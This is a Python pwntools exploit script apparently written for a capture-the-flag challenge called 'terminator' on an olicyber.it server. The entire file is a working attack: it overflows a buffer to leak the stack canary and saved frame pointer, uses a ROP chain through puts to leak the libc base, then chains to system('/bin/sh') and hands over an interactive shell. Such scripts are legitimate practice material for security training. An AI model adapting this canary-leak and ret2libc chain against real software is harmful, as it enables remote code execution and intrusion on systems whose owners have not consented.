from pwn import *

exe = ELF("./terminator")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

HOST = "terminator.challs.olicyber.it"
PORT = 10307

# args.LOCAL = True
args.DEBUG = True

gdbscript = """
set follow-fork-mode child
b *0x0040128a
c
"""

PUTS    = pack(0x004011b8)
POP_RDI = pack(0x004012fb)
RET     = pack(0x00401016)

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r, gdbscript)
    else:
        r = remote(HOST, PORT)

    return r

def fix(s):
    return (b"\x41" * 8 + s).ljust(56, b"\x41")

def leak_canary_and_rbp(r):
    r.sendlineafter(b"> ", b"a" * 55)
    line = r.recvuntil(b"from?").split()
    
    canary = int.from_bytes(line[2][:7][::-1] + b"\x00")
    rbp = int.from_bytes(line[2][7:13][::-1])

    return canary, rbp

def leak_libc(r, canary, rbp):
    rop_chain = fix(POP_RDI + pack(exe.got.puts) + PUTS) 

    payload = rop_chain + pack(canary) + pack(rbp - 0x60)
    r.sendlineafter(b">", payload)
    r.recvline()
    
    libc.address = int.from_bytes(r.recvline()[::-1][1:]) - libc.symbols.puts
    
def run_system(r, canary, rbp):
    BINSH = pack(next(libc.search(b"/bin/sh\0")))
    
    rop_chain = fix(RET + POP_RDI + BINSH + pack(libc.symbols.system))

    payload = rop_chain + pack(canary) + pack(rbp - 0x90)
    r.sendlineafter(b">", payload)
    
def main():
    r = conn()
    
    canary, rbp = leak_canary_and_rbp(r)
    log.success(f"Leaked canary: {hex(canary)}")
    log.success(f"Leaked rbp: {hex(rbp)}")

    leak_libc(r, canary, rbp)
    log.success(f"Leaked libc base: {hex(libc.address)}")

    run_system(r, canary, rbp)
    
    r.interactive()
    
if __name__ == "__main__":
    main()
